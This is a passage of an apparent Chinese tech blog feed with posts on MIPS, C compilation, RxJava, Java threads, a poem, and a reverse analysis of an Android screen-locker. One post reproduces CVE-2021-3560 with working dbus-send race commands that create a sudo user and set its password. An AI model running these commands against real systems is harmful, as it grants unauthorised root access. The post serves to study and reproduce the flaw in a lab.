&lt; im) ? 1 : 0</p><p><strong>and&#x2F;andi:</strong>    与运算，两个寄存器中的内容相与 ;i为立即数。 rd &#x3D; rs &amp; rt ; rd &#x3D; rs &amp; im</p><p><strong>or&#x2F;ori</strong>:       或运算。 rd &#x3D; rs | rt ; rd &#x3D; rs | im</p><p><strong>xor&#x2F;xori</strong>:     异或运算。 rd &#x3D; rs ^ rt ;rd &#x3D; rs ^ im</p><p><strong>nor&#x2F;nori:</strong>     取反运算。 rd &#x3D; !(rs | rt)</p><p><strong>j&#x2F;jr&#x2F;jal&#x2F;jalr</strong>:              j直接跳转 PC &#x3D; { (PC+4) [31,28] , addr, 00}；jr使用寄存器跳转 PC &#x3D; rs； jal  $31 &#x3D; PC;PC &#x3D; {(PC+4) [31,28],addr,00}</p><p><strong>beq&#x2F;beqz&#x2F;benz&#x2F;bne</strong>:      条件转移eq相等，z零，ne不等。 beq , PC &#x3D; (rs &#x3D;&#x3D; rt) ? PC+4+im &lt;&lt; 2 :  PC ; bne , PC &#x3D; (rs !&#x3D; rt) ? PC+4+im &lt;&lt; 2 :  PC </p><p><strong>lui</strong>:                    把一个16位的立即数填入到寄存器的高16位，低16位补零。 rt &#x3D; im * 65536(2^16)</p><p><strong>lw</strong>:                    rt &#x3D; memory[ rs + im]</p><p><strong>sw</strong>:                    memory[ rs + im] &#x3D; rt</p><p><strong>sll&#x2F;srl</strong>:                 逻辑左移&#x2F;右移。 rd &#x3D; rs &lt;&lt; shamt ; rd &#x3D; rs &gt;&gt; shamt </p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-3560 Polkit权限提升漏洞复现</title>
    <link href="/article/86aaf27b.html"/>
    <url>/article/86aaf27b.html</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-3560-Polkit权限提升漏洞"><a href="#CVE-2021-3560-Polkit权限提升漏洞" class="headerlink" title="CVE-2021-3560 Polkit权限提升漏洞"></a>CVE-2021-3560 Polkit权限提升漏洞</h1><p>6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户</p><p>Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务</p><blockquote><p>Polkit 则会根据特权进程提供的信息和权限配置文件进行认证</p><p>认证完成后将认证结果返回给特权进程</p><p>特权进程会根据认证结果来决定是否给非特权进程提供服务</p><p>而我们在认证操作中断开连接，导致无法获取认证结果</p><p>具体后边会详细分析</p></blockquote><p>由于systemd使用Polkit，所以几乎所有使用systemd的Linux都自带polkit</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>环境：ubuntu20.04  </p><blockquote><p><a href="http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso">http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso</a> </p></blockquote><p>ssh（ 在本地ssh下操作）</p><blockquote><p>sudo apt install ssh</p><p>sudo service ssh start</p><p>ssh <a href="mailto:&#117;&#115;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;">&#117;&#115;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;</a></p></blockquote><p>具体为什么要用ssh，这里不做赘述，可以自行百度dbus</p><p>dbus-send发送D-Bus消息的工具，主要用于测试</p><p>可以通过dbus-send从命令行触发polkit</p><p>通过dbus-send构造语句，来创建一个新用户</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png" alt="image-20220402141819448"></p><p>正常情况返回肯定是认证不通过的</p><p>上面说了通过中断来实现认证通过</p><p>所以继续构造语句</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 &amp; sleep 0.009s ; kill $!</p></blockquote><p>这里是开始执行后0.009秒断开连接</p><p>这里多久断开连接要看具体执行时间，可以在前面加time 测试</p><p>我这里大概时间在0.015秒左右，所以我提前在0.009秒断开，具体测试时看执行时间</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141825690.png" alt="image-20220402141825690"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141832450.png" alt="image-20220402141832450"></p><p>运气比较好，一次就成了，有个可能运气不太好，需要多试个千八百次的</p><p>然后用 id 可以看到语句中构造的yunku 已经存在了，而且在sudo组，具有root权限</p><p>现在已经成功利用漏洞创建了用户，但是该用户没有用户名，所以无法登陆</p><p>继续构造语句来设置密码</p><p><code>这里涉及到一个知识点，dbus接口设置密码需要通过散列值</code></p><p>通过openssl可以生成散列值(-5是指定 sha256 算法来生成散列值， -6 是 sha512，-1 是 md5)</p><blockquote><p>openssl passwd -5 password</p><p>(这里password是个人需要设置的密码)</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141841022.png" alt="image-20220402141841022"></p><p>构造设置密码语句(User1001 是创建的sudo用户uid 可以通过id 用户名查看， string 后放置密码散列值)</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts&#x2F;User1001 org.freedesktop.Accounts.User.SetPassword string:’$5$P28GOS55linQ0Fe&#x2F;$2dn4a1duWxR9wFIYeO7qfO7ieDZvE25zPh1oxm3&#x2F;Pn6’ string:Whatever &amp; sleep 0.009s ; kill $! </p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141847603.png" alt="image-20220402141847603"></p><p>多试这个也需要多试几次</p><p>成功之后可以登陆尝试</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141854349.png" alt="image-20220402141854349"></p><p>至此，复现结束！</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过dbus创建新用户时，dbus-send向account-daemon发起请求会先发送到dbus-daemon</p><p>dbus-daemon会先添加dbus id（这里方便理解 id为 10）到请求中，然后将请求发给account-daemon</p><p>account-daemon收到请求后向poklit询问id为10的连接有没有权限</p><p>poklit向dbus-daemon询问该连接的uid </p><p>如果返回的uid为0，就授权，否则打开验证密码窗口让用户输入密码</p><p>以上步骤完成后</p><p>poklit返回true给account-daemon</p><p>account-daemon创建新用户</p><p>但是！</p><p>如果我们在<code>poklit向dbus-daemon询问该连接的uid</code>时断开，那这个连接就不存在</p><p>不存在，就会返回错误</p><p>而poklit的错误处理信息不会拒绝该请求，而是将uid视为0，来授权</p>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>智能合约</title>
    <link href="/article/c85b8ed3.html"/>
    <url>/article/c85b8ed3.html</url>
    
    <content type="html"><![CDATA[<p>基于以太坊的solidity智能合约。</p><p>在线编辑器环境位置：<a href="https://remix.ethereum.org/">https://remix.ethereum.org</a></p><p>智能合约文件是以.sol结尾</p><div class="code-wrapper"><pre><code class="hljs solidity">pragma solidity ^0.4.0;//预编译的作用，^代表版本向上兼容，兼容0.4.x，不能兼容到0.5.0</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROT13算法</title>
    <link href="/article/dd959000.html"/>
    <url>/article/dd959000.html</url>
    
    <content type="html"><![CDATA[<h1 id="ROT13加密算法"><a href="#ROT13加密算法" class="headerlink" title="ROT13加密算法"></a>ROT13加密算法</h1><p>凯撒加密的一个变种</p><p>单纯的将所有的字符后推13位，超过Z(z)的从A(a)开始换</p><p>这就导致他可以用一个算法实现加解密</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入要加解密的key：&quot;</span>)flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:    n = <span class="hljs-built_in">ord</span>(i)    <span class="hljs-keyword">if</span> (n &gt;= <span class="hljs-number">97</span> <span class="hljs-keyword">and</span> n &lt; <span class="hljs-number">110</span>) <span class="hljs-keyword">or</span> (n &gt;= <span class="hljs-number">65</span> <span class="hljs-keyword">and</span> n &lt;= <span class="hljs-number">78</span>) :        flag += <span class="hljs-built_in">chr</span>(n+<span class="hljs-number">13</span>)    <span class="hljs-keyword">elif</span> (n &gt;= <span class="hljs-number">110</span> <span class="hljs-keyword">and</span> n &lt; <span class="hljs-number">122</span>) <span class="hljs-keyword">or</span> (n &gt;= <span class="hljs-number">78</span> <span class="hljs-keyword">and</span> n &lt;= <span class="hljs-number">90</span>):        flag += <span class="hljs-built_in">chr</span>(n-<span class="hljs-number">13</span>)    <span class="hljs-keyword">else</span>:        flag += i<span class="hljs-built_in">print</span>(flag)</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一个c语言代码变为c语言程序的全过程</title>
    <link href="/article/5aedeb05.html"/>
    <url>/article/5aedeb05.html</url>
    
    <content type="html"><![CDATA[<div class="code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span>&#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>这样一段代码通过编译器进行如下操作后来得到可执行文件</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140948521.png" alt="image-20220402140948521"></p><p>下面详细说明下每个步骤</p><h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><p>根据<code>#</code>开头的命令，将头文件命令行代码插入代码</p><p>可以用gcc -E hello.c -o hello.i 来只完成预处理</p><p>打开hello.i 可以发现代码前边多处500多行代码</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140956951.png" alt="image-20220402140956951"></p><p>这个可以在本机目录下找到stdio.h这个文件</p><p>这就是预处理的整个过程</p><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>将hello.i编译成汇编语言，这个过程之后程序会更接近机器语言</p><blockquote><p>这里解释下什么是机器语言，什么是高级语言</p><p>我们定义 00100 1 0的含义为1 + 0 即 00100 为加号 1 为被加数 0 为加数</p><p>这样写偏向于底层，在程序员看来是非常不直接的，不方便的。（这种二进制代码也被称为硬编码）</p><p>那我们再次规定，我们用add 1 0 来表示1 + 0，这样子容易理解多了，</p><p>（类似于早期这种比较简单语言称为汇编语言，这样的代码需要巨大的代码量来完成一些简单的逻辑）</p><p>人们使用汇编语言将常用的一些逻辑二次封装成为比较人性化的代码</p><p>再把 add 1 0 二次封装，为 1 + 0 这样，就很方便使用和理解</p><p>（这种代码就被称为高级语言，这种语言更符合人类的使用习惯）</p><p>上面这串代码从下往上的过程，就被称为代码的编译，处理它们的软件被称为编译器</p></blockquote><p>使用 gcc -S hello.i -o hello.s可以将预处理后的文件编译为汇编语言的文件</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141005753.png" alt="image-20220402141005753"></p><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>将hello.s 打包成<code>可重定位目标程序</code> hello.o</p><p>这一步已经将机器语言变成了二进制文件，用文本文件打开后会看到乱码</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141013182.png" alt="image-20220402141013182"></p><p>但仍然可以用二进制文本编辑器查看</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141021358.png" alt="image-20220402141021358"></p><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>我们上边说过，早期人们将一些常用的逻辑打包，</p><p>一些常用逻辑包放在在标准库，使大家不需要每个函数都存放在代码里</p><p>就比如我们使用的printf 函数在标准库中的printf.o文件</p><p>在链接时，将hello.o 和printf.o两个文件打包成可执行文件</p><p>使用 gcc hello.o -o hello 就可以链接需要的文件得到可执行文件</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Rxjava学习笔记</title>
    <link href="/article/f44be05a.html"/>
    <url>/article/f44be05a.html</url>
    
    <content type="html"><![CDATA[<h1 id="RxJava"><a href="#RxJava" class="headerlink" title="RxJava"></a>RxJava</h1><p>是基于事件流，进行<code>异步操作</code>的库，类似于android中的AsyncTask，Handler的作用</p><p>特点在于逻辑简洁实现优雅使用简单。</p><h1 id="Rxjava的逻辑流程"><a href="#Rxjava的逻辑流程" class="headerlink" title="Rxjava的逻辑流程"></a>Rxjava的逻辑流程</h1><p>顾客到饭店吃饭，找服务员点菜，服务员到厨房下单，后厨根据顺序烹调出对应的菜式，然后按顺序一一送给顾客</p><p>在整个逻辑中有四个角色</p><p>顾客：被观察者（observable）</p><p>厨房：观察者（Observer）</p><p>服务员：订阅（SubScribe）</p><p>菜式：事件（Event）</p><p>被观察者产生事件，观察者接收事件并且给出响应动作</p><p>订阅连接观察者和被观察者</p><p>事件是被观察者 &amp; 观察者 沟通的载体</p><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><p>引入依赖</p><div class="code-wrapper"><pre><code class="hljs xml">implementation &quot;io.reactivex.rxjava3:rxjava:3.x.y&quot;（这里xy指的是版本号，尽量去github自己看，我这里用的是3.0.13）</code></pre></div><p>创建方式，还是一般创建方式</p><p>我这里使用的是rxjava3，直接写在了mainactivity中</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//正常创建形式</span><span class="hljs-comment">//创建被观察者</span>        Observable.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObservableOnSubscribe</span>&lt;String&gt;() &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">subscribe</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> ObservableEmitter&lt;String&gt; emitter)</span> <span class="hljs-keyword">throws</span> Throwable &#123;                <span class="hljs-keyword">try</span> &#123;                    <span class="hljs-comment">//在这里传递参数</span>                    emitter.onNext(<span class="hljs-string">&quot;这是第一个参数&quot;</span>);                    emitter.onComplete();                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;                    <span class="hljs-comment">//在这里传递异常</span>                    emitter.onError(e);                &#125;            &#125;            <span class="hljs-comment">//这里相当于直接创建观察者并订阅</span>        &#125;).subscribe(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>&lt;String&gt;() &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Disposable d)</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;调用subscribe&quot;</span>);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> String s)</span> &#123;                Log.d(TAG,s);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Throwable e)</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;错误被调用&quot;</span>);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;onComplete被调用&quot;</span>);            &#125;        &#125;); <span class="hljs-comment">//just方法直接传递数据</span>        Observable.just(<span class="hljs-string">&quot;测试参数&quot;</span>).subscribe(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>&lt;String&gt;() &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Disposable d)</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;调用subscribe&quot;</span>);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> String s)</span> &#123;                Log.d(TAG,s);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Throwable e)</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;错误被调用&quot;</span>);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;onComplete被调用&quot;</span>);            &#125;        &#125;);</code></pre></div><p>rxjava可以传递数组</p><p>不过rxjava3抛弃了from改用了具体的from类型</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">int</span>[] intArray = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;Observable.fromArray(intArray).subscribe(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>&lt;<span class="hljs-type">int</span>[]&gt;() &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Disposable d)</span> &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-meta">@NonNull</span> [] ints)</span> &#123;        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a : ints)&#123;            Log.d(TAG, a+<span class="hljs-string">&quot;&quot;</span>);        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Throwable e)</span> &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> &#123;    &#125;&#125;);</code></pre></div><p>这里具体使用见文档，不多做赘述</p>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>老去的尼尼卡 --英雄的迟暮</title>
    <link href="/article/f8245e93.html"/>
    <url>/article/f8245e93.html</url>
    
    <content type="html"><![CDATA[<h2 id="老去的尼尼卡"><a href="#老去的尼尼卡" class="headerlink" title="老去的尼尼卡"></a>老去的尼尼卡</h2><p>我们的尼尼卡老去了， </p><p>他伟岸的肩膀不再挺拔…… </p><p>这位满头白发的老人</p><p>真的曾经拥有钢铁一般的力量？ </p><p>啊，母亲啊！</p><p>到底有多少次他挥舞着“土狼”镰刀， </p><p>袒胸露背，</p><p>在麦田的尽头突然大声地咆哮。 </p><p>他肯定搬移过大山 把它们并排而列， </p><p>他那滴汗的脸上 喷射着火焰和浓烟。 </p><p>可他现在连膝盖都动不了，</p><p>岁月割去了它们。 </p><p>他只能躺下，</p><p>或者做梦，</p><p>或者告诉他子孙的子孙 </p><p>他曾经的过往。 </p><p>他偶尔会听见 </p><p>附近麦田传来的歌声， </p><p>他那曾经坚硬的心开始愉悦地跳动。 </p><p>他颤抖地走出了门。 </p><p>他拄着拐杖往前走了几步。 </p><p>当他看到年轻的小伙， </p><p>他安慰地笑了起来。 </p><p>——索塞罗</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140855691.png" alt="image-20220402140855691"></p>]]></content>
    
    
    <categories>
      
      <category>诗</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一个安卓锁机软件的逆向分析</title>
    <link href="/article/e48e684a.html"/>
    <url>/article/e48e684a.html</url>
    
    <content type="html"><![CDATA[<p>前两天在吾爱上看到有人求助手机被锁，顺手吧样本下载了，分析下。</p><p>样本桌面是一个百度网盘的图标</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141506388.png" alt="image-20220402141506388"></p><p>这像素一看就是假的。。。</p><p>打开后是个root锁机，这里还是提醒各位没事不要随便开root权限，这都2021年了，还有这种垃圾软件，也是服了！</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141514360.png" alt="image-20220402141514360"></p><p>直接jeb</p><p>启动后看到这变量名是真恶心啊！！！</p><p>发现MainActivity中只调用了一个hh</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141521365.png" alt="image-20220402141521365"></p><h2 id="第一个页面"><a href="#第一个页面" class="headerlink" title="第一个页面"></a>第一个页面</h2><p>这里发现第一个页面是第四层函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141530861.png" alt="image-20220402141530861"></p><p>这里主要是q()中是个文字编码，提取出来，把这两行解密下。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141538590.png" alt="image-20220402141538590"></p><p>这里有一行解码后发现是一个网站，猜测可能是访问网站返回解码</p><p>100000005线程处跟进</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141544779.png" alt="image-20220402141544779"></p><p>本质是做了一个判断，继续跟进isINTERET()</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141552826.png" alt="image-20220402141552826"></p><p>这里发现9160，尝试下，对了</p><p>然后进入第二个页面</p><p>（还是多重锁机骗钱，可以很骚，很傻逼）</p><h2 id="第二个页面"><a href="#第二个页面" class="headerlink" title="第二个页面"></a>第二个页面</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141602192.png" alt="image-20220402141602192"></p><p>第二层是第五层的函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141609649.png" alt="image-20220402141609649"></p><p>跟进100000008</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141617211.png" alt="image-20220402141617211"></p><p>点击屏幕30次会出现两个控件</p><p>然后跟进100000009</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141624353.png" alt="image-20220402141624353"></p><p>这里try里边先做了一个字符编码，直接把m这个函数摘下来稍作修改</p><p>解码后是9，5，10</p><p>然后通过这三个数做了运算</p><p>同样吧加密摘下来</p><p>这个加密处理处v0.val$test 是界面给的序列号</p><p>这个序列号是通过取随机数然后通过m下的方法处理后的（这个软件变量方法名太恶心了，就在第五层的倒数第三行）</p><p>还是老办法，把这个函数取出来处理下</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141631663.png" alt="image-20220402141631663"></p><p>把v1，v2 的值交换下就可以了</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141638554.png" alt="image-20220402141638554"></p><p>转第二层锁</p><h2 id="第三个页面"><a href="#第三个页面" class="headerlink" title="第三个页面"></a>第三个页面</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141647476.png" alt="image-20220402141647476"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141654580.png" alt="image-20220402141654580"></p><p>这个和上一个差不多做法就不细说了</p><p>把改过的函数挂出来吧（这里边函数或者变量名是修改过的，后边会把整个项目脚本放上来，可以看那个）</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141702375.png" alt="image-20220402141702375"></p><p>解出来后跳到第四个页面</p><h2 id="第四个页面"><a href="#第四个页面" class="headerlink" title="第四个页面"></a>第四个页面</h2><p>第三层函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141710260.png" alt="image-20220402141710260"></p><p>和上边也是差不多</p><p>继续改函数</p><p>这里要注意 粉红兔 这个实例在创建的时候传了个 fuck参数（当时找了好久，好烦呀）</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141718598.png" alt="image-20220402141718598"></p><p><img src="https://i.loli.net/2021/05/28/njByRldAL7HgmqP.png" alt="image-20210528183252244"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141726058.png" alt="image-20220402141726058"></p><p>搞定，下一层下一层</p><h2 id="第五个页面"><a href="#第五个页面" class="headerlink" title="第五个页面"></a>第五个页面</h2><p>第一层函数，看起来也差不多</p><p>看第四个页面，不过这里又个迷惑人的点</p><p>随机码多了一个b，解码时删掉这个解就好</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141734543.png" alt="image-20220402141734543"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141741322.png" alt="image-20220402141741322"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没有什么特别奇怪的算法，都是大差不差，刚去看了下吾爱，好像有师傅提前解出来了</p><p>网站也是被挺多人留言了</p><p>分析的时候去找过那个qq群，好像还在运行，这种人就挺可恶的</p><p>拿技术做坏事，为人所不齿</p><p>脚本因为是分析的时候写的，乱得很，这里先放上来</p><p><a href="https://gitee.com/p1piyang/backward-analysis/tree/master">https://gitee.com/p1piyang/backward-analysis/tree/master</a></p><p>累死了！！！</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>java多线程</title>
    <link href="/article/11bde6ec.html"/>
    <url>/article/11bde6ec.html</url>
    
    <content type="html"><![CDATA[<p>(因为是迁移过来的，好多图片都丢失了，建议自己复制代码运行看一下)</p><h1 id="串行与并发"><a href="#串行与并发" class="headerlink" title="串行与并发"></a>串行与并发</h1><ol><li>串行 当有多个任务需要执行时，是按照从前往后的顺序去执行的顺序就叫串行。<br>类比的话就是一条单行道上的车辆肯定是前后顺序，不可能同时通行多辆车。 </li><li>并发是让多个任务同时执行。<br>一条马路上的两条单行车道上两辆车同时执行，这两辆车就是并发的状态。</li></ol><p>程序的运行状态一般是串行与并发同步进行的。 </p><h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><p>进程是对一个程序运行是各种资源的描述（cpu，内存等），进程实现多个任务并发运行。<br>进程资源不共享。</p><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><p>线程是进程的最小单元。<br>如果把进程看成一座工厂，进程就是进程中的流水线。<br>一个进程中有多个线程，且一个进程中有多个线程。<br>线程资源共享（临界资源）。 </p><h1 id="并发是怎么做到的"><a href="#并发是怎么做到的" class="headerlink" title="并发是怎么做到的"></a>并发是怎么做到的</h1><p>计算机给某个进程（或线程）分配固定的cpu时间，让cpu快速的在不同进程（或线程）中快速切换，来造成同时运行的假象。<br>cpu的运行速度是非常快的，人反应不过来，这才导致的并发假象。 （是假象）</p><h1 id="线程的生命周期"><a href="#线程的生命周期" class="headerlink" title="线程的生命周期"></a>线程的生命周期</h1><p>从被实例化完成到被销毁。<br>线程的状态:</p><ol><li>新生态 New ：一个线程被实例化完成，没有做任何操作。</li><li>就绪态 Ready：一个线程已经被开启，已经开始争抢cpu时间片（某段时间去运行这个线程）。</li><li>运行态 Run： 一个线程抢到了cpu时间片，已经开始执行现成的逻辑。</li><li>阻塞态 Interrupt：正在运行的过程中受到某些操作的影响，放弃了已经获取到的cpu时间片，并且不再参与cpu时间片的争抢，处于挂起状态。（scanf sleep join等）</li><li>死亡态 Dead：一个线程对象被销毁。</li></ol><h1 id="创建实例化线程"><a href="#创建实例化线程" class="headerlink" title="创建实例化线程"></a>创建实例化线程</h1><ol><li><p>继承Thread类，自定义线程类</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadCreate1</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//实例化子线程</span>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">myThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();        <span class="hljs-comment">//通过start方法开启线程，如果直接调用run方法他会把线程当作普通类来运行</span>        myThread.start();        <span class="hljs-comment">//在线程之后打印句话来感受下线程</span>        System.out.println(<span 